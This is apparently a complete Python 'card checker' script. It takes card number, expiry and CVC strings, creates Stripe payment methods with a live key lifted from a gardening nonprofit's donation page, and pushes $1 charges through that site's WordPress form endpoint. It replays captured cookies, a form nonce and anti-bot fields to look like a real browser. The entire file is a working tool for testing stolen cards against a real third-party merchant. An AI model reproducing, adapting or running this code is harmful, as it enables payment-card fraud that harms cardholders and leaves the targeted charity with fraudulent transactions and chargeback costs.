import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()

	headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Linux"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
}

	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&billing_details[address][postal_code]=10004&guid=85f933ec-7146-408f-bd2e-83b30848c089ebb1b5&muid=112f9b6d-9bc0-4923-8096-0d5b5e71900ed60971&sid=2526caff-cd08-4202-a273-e0eddcb78376db060d&payment_user_agent=stripe.js%2F332636417d%3B+stripe-js-v3%2F332636417d%3B+card-element&referrer=https%3A%2F%2Fwww.cobbmastergardeners.com&time_on_page=70805&client_attribution_metadata[client_session_id]=95edd21a-d7b1-4aab-b222-968cda83b6b7&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&client_attribution_metadata[wallet_config_id]=5b0871dd-c437-48b8-8b45-e300fd1d3f96&key=pk_live_51S98p4JuXLdLHsyha3tmnfWRCaW5PXcbINdnkC2VmdrJgfR6RI5L1x69kBmQFF04ErQ3i4Egp2VCxDM6KOQErGh600VQmb6nfU&'

	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)

	pm = r1.json()['id']
	
	cookies = {
    '_ga': 'GA1.1.1601413967.1777275939',
    '__stripe_mid': '112f9b6d-9bc0-4923-8096-0d5b5e71900ed60971',
    '__stripe_sid': '2526caff-cd08-4202-a273-e0eddcb78376db060d',
    '__cf_bm': 'xKyq1K50d5bELLZLdOf3j0bkZaU6xxVxrh5iTJu48fE-1777276133.156993-1.0.1.1-CheyxxPd7Z3Xm7kRE.b.YsGBm79beH9_7ayPh6cjvX4.rDznK_3TJYSEQNg7qHkJh_J75mz_nCUPuPaAI1HLXjq8kevdzUi5Q6VsGG8inI1yq6oUEc1EaH_3DlOTTaXJ',
    '_ga_55HKLZFP05': 'GS2.1.s1777275938$o1$g1$t1777276134$j15$l0$h0',
}

	headers = {
    'authority': 'www.cobbmastergardeners.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': '_ga=GA1.1.1601413967.1777275939; __stripe_mid=112f9b6d-9bc0-4923-8096-0d5b5e71900ed60971; __stripe_sid=2526caff-cd08-4202-a273-e0eddcb78376db060d; __cf_bm=xKyq1K50d5bELLZLdOf3j0bkZaU6xxVxrh5iTJu48fE-1777276133.156993-1.0.1.1-CheyxxPd7Z3Xm7kRE.b.YsGBm79beH9_7ayPh6cjvX4.rDznK_3TJYSEQNg7qHkJh_J75mz_nCUPuPaAI1HLXjq8kevdzUi5Q6VsGG8inI1yq6oUEc1EaH_3DlOTTaXJ; _ga_55HKLZFP05=GS2.1.s1777275938$o1$g1$t1777276134$j15$l0$h0',
    'origin': 'https://www.cobbmastergardeners.com',
    'referer': 'https://www.cobbmastergardeners.com/support/',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Linux"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

	params = {
    't': '1777276206249',
}

	data = {
    'data': 'ak_hp_textarea=&ak_js=1777276134322&__fluent_form_embded_post_id=6015&_fluentform_12_fluentformnonce=12d3e8203d&_wp_http_referer=%2Fsupport%2F&names%5Bfirst_name%5D=Niko&names%5Blast_name%5D=Lam&email=bohtoobb%40gmail.com&input_text=&payment_input=Other&custom-payment-amount=1&payment_method=stripe&ak_bib=1777276148762&ak_bfs=1777276205312&ak_bkpc=4&ak_bkp=10%3B3%3B4%3B4%3B&ak_bmc=1%3B2%2C511%3B9%2C840%3B53%2C1497%3B13%2C1894%3B14%2C1926%3B14%2C1569%3B10%2C49171%3B8%2C1142%3B&ak_bmcc=9&ak_bmk=&ak_bck=&ak_bmmc=1&ak_btmc=1&ak_bsc=3&ak_bte=1%3B1%2C384%3B43%2C771%3B65%2C1466%3B476%2C1039%3B52%2C371%3B62%2C1880%3B58%2C1527%3B54%2C49124%3B37%2C1096%3B&ak_btec=10&ak_bmm=5%2C681%3B&ak_bcc=50%2C17%2C65%2C43%3B47%2C25%2C61%2C63%3B108%2C39%2C34%2C60%3B686%2C810%2C97%2C96%3B215%2C45%2C69%2C69%3B157%2C32%2C50%2C49%3B213%2C24%2C33%2C37%3B432%2C669%2C68%2C98%3B149%2C29%2C72%2C61%3B&__stripe_payment_method_id='+str(pm)+'',
    'action': 'fluentform_submit',
    'form_id': '12',
}

	r2 = requests.post(
    'https://www.cobbmastergardeners.com/wp-admin/admin-ajax.php',
    params=params,
    cookies=cookies,
    headers=headers,
    data=data,
)
	return (r2.json())
